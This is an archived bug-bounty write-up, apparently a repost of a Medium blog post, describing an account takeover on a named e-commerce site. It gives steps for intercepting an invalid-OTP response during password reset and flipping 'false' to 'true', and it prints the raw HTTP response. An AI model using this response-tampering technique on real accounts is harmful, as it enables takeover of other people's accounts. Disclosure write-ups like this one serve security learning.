# How I found a Account Takeover in a big Ecommerce Website.

- **Source URL:** https://medium.com/@yashsancheti24/how-i-found-a-account-takeover-in-a-big-ecommerce-website-40df4f165b1f?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20230328201632/https://medium.com/@yashsancheti24/how-i-found-a-account-takeover-in-a-big-ecommerce-website-40df4f165b1f
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/1909 (id 1909)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# How I found a Account Takeover in a big Ecommerce Website.

Hi,

So I found this vulnerability long time ago but documenting this now. Hope you will learn something from it.

Steps to reproduce:-

1. Go to forgot password and enter mobile/email and then send OTP to your mobile/email.
2. Write any invalid OTP and capture the invalid OTP request.
3. Check the response code for invalid OTP request. I found the response code is

HTTP/1.1 200 OK

Content-Type: text/html; charset=UTF-8

Connection: close

Date: Thu, 19 Mar 2020 06:14:20 GMT

Vary: Accept-Encoding

Access-Control-Allow-Origin: \*.pantaloons.com

device: desktop

Set-Cookie: 374584e8af038c3e0bcb88a1a8c00f82=5ze8obq9ACoJCxxQJp1EO3QQslEWYhugGmIWdwQESazqOgcMG9lZgW64OzhTVXDL2M8hauCaHsLHhvpW38ZMeZtBrkWb7h%2Fgpc0qb2vTgmBWZHKPyh%2BNi%2BC0yLl4dL%2B06rGVo%2FZGYX5ZkrZhkwTSa7%2FugasS7DV0FvfVjPNRXV97ALzNE3GeTil6HTeTHB9X0E2s70AMZo8gQd10gamxWSNHvxgD1fn5JnHSn1j%2FAs%2B2ckuilRSWsJlSw4IJMZN2YeOGlBV2CxENa%2BD6ROzKxkvr1ZmRtRWhoXOlonAadSvWQNC6HeiPNZD%2BvXiBsVgCrItYqi6i74EA7CaVYyC21VMoJEXeQ7uLG3oD8kz1AwC7GZ8du98RSab6QN6RCgG3Y%2Few8huRP%2BJddFuxS379j384fHinW6xCH6KRLuNcxVdYNd8Owo0%2FauP9KjYw2Atsw4wyXekJExmemRCvJA6PoOlR5DLqgPog8%2FAxmUBoguWDG%2BAGZok6kEaaY7m6T9NSZMPLpr1IQE9Hpw%2Fm4ryT6ROqBko06a0CIqnnlhlDUII%2Br5EbedMGuxrGaDoTlcCFueBwlqMqlEZFhPOI%2BaEteYhZqHIZDyr6XPZXSOvqsX8yekjHNGoXYCs9U0o1AxClD0gHSlfQvFXGTCOfLzjhH6W2y9BMAerQt7Voce%2F4u2K0Z%2FBPY0ySgu9CFc1n36OWS9CZwz69jeV8CoNeYHU2FkD8eRsvjndLO3YmShtPZPsh113nzNAQiF3yj8sx%2BCjcmnoB50C%2FWLIeWc7qXnV56SHA9IkDM2bmImvayZN6Vd8M6Fvu7SGZSI6FHjGbqbZvMIjEqOX6LU1BCEQHOS1TFHgi2knZNbI3og0hbSJY2GDZWEAClzGN0zoVwjq6nx%2BUbKLPmUA0Ma%2BWIfEY0RLF6guNGKZr51X8rbH6T1c53t3kIikNyiVTFMXYUa1YJN1Zaq9cEtcjXQTLj9KCZtPDEg%3D%3D898d47fe391758a5f6d6806f1732225c7696ba19; expires=Mon, 20-Apr-2020 06:17:40 GMT; path=/; secure; httponly

Server: abfrl-server

C-ID: 00fa42b22b0b

X-Frame-Options: SAMEORIGIN

X-Content-Type-Options: nosniff

X-XSS-Protection: 1; mode=block

Referrer-Policy: same-origin

Strict-Transport-Security: max-age=2629746; includeSubdomains; preload

X-Page-Speed: 1.11.33.4–0

Cache-Control: max-age=0, no-cache

X-Cache: Miss from cloudfront

Via: 1.1 61b4c35933aabd8addcb4e725a4c81f8.cloudfront.net (CloudFront)

X-Amz-Cf-Pop: BOM50-C1

X-Amz-Cf-Id: mE2hc2XqxXVwW4t\_7e2t3yp0e2MkWt\_doFgE7M1ITF8uMYSgJsqGAQ==

Content-Length: 116

{“success”:false,”msg”:”\<div class=\”alertflash alert alert-danger\”>\<div>Please enter valid OTP !\<\/div>\<\/div>”}


4\. Then I changed “false” to “true” in response and removed the other part and then forwarded this response.

Boom!

I was able to change the password and successfully logged into the account.

Hope you liked it!

Thanks for reading.. Happy hacking!!
